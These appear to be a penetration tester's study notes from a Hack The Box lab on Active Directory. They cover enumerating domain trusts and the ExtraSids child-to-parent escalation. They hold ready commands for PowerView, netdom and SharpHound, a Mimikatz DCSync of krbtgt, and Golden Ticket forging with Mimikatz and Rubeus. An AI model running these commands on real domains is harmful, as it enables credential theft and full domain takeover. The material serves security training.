
# Enumerating Trust Relationships


## activedirectory
- ForestTransitive : mean outside the forest        
- IntraForest : mean inside the forest

```powershell
Import-Module activedirectory
Get-ADTrust -Filter *
```

## Powerview
```powershell
Import-Module ./powerview.ps1

Get-DomainTrust
Get-DomainTrustMapping

# Checking Users in the Trusted domains using Get-DomainUser
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

```

## netdom 
```powershell
# Using netdom to query domain trust
netdom query /domain:inlanefreight.local trust

# Using netdom to query domain controllers
netdom query /domain:inlanefreight.local dc

# Using netdom to query workstations and servers
netdom query /domain:inlanefreight.local workstation


```


## BloodHound
- BloodHound to visualize these trust relationships by using the `Map Domain Trusts` pre-built query

```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT

bloodhound 
```
![Screenshot 2024-07-08 at 03-30-53 Hack The Box - Academy](https://github.com/kiro6/penetration-testing-notes/assets/57776872/52df1ad6-e669-47dc-a10a-5ba242815a78)


# From child to parent Trusts Abuse
- The sidHistory attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain.
- The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.
- SID history is intended to work across domains, but can work in the `same domain`.


## ExtraSids Attack
- This attack allows for the compromise of a parent domain once the child domain has been compromised.
- if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group
- then this account will be able to perform DCSync and create a Golden Ticket or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

### Steps
- comprmised DC in a child domain
- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz or any tool.

### Windows

1) **Obtaining the KRBTGT**
```powershell
mimikatz.exe "lsadump::dcsync /user:LOGISTICS\krbtgt"
```
2) **Using Get-DomainSID**
```powershell
Get-DomainSID
```
3) **Obtaining Enterprise Admins Group's SID**
```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
4) **Creating a Golden Ticket**
```powershell

# mimikatz
mimikatz.exe "kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt"

# Rubeus
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
5) **Confirming a Kerberos Ticket is in Memory**
```powershell
klist
```

6) Performing a DCSync Attack against parent domain then we can forge golden ticket
```
.\mimikatz.exe "lsadump::dcsync" "/domain:INLANEFREIGHT.LOCAL" "/user:INLANEFREIGHT\lab_adm"
```
